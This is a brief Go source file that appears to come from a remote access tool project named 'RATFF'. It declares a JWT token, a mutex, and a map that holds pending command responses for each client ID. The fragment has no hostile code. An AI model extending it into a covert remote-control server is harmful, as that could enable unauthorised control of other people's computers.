package main

import (
	"sync"

	"RATFF/shared"
)

// jwtToken stores the authenticated JWT token for API requests.
var jwtToken string

// pendingCommand holds a channel waiting for a command response.
type pendingCommand struct {
	ch chan shared.Message
}

// pendingMu protects the pendingCmd map for concurrent access.
var pendingMu sync.Mutex

// pendingCmd stores pending command responses keyed by client ID.
var pendingCmd = make(map[string]*pendingCommand)
